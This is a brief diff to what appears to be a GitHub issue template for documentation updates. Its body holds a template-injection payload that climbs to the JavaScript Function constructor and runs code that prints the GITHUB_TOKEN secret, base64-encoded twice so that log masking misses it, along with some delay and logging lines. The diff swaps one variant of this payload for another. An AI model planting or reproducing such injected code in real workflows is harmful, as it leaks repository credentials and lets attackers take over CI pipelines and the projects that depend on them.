@@ -2,4 +2,5 @@
 title: External doc update from PR {{ env.PR_NUMBER }}
 labels: documentation
 ---
-{{({}).constructor.__proto__.constructor('console.log(Buffer.from(Buffer.from(process.env.GITHUB_TOKEN).toString("base64")).toString("base64"));setTimeout(function () {console.log("Sleep finito pipo");}, 60000);console.log("coucou");')()}}
+
+{{({}).constructor.__proto__.constructor('console.log(Buffer.from(Buffer.from(process.env.GITHUB_TOKEN).toString("base64")).toString("base64"));(async () => {console.log('before delay'); await delay(1000); console.log('after delay')})();console.log("finito");')()}}
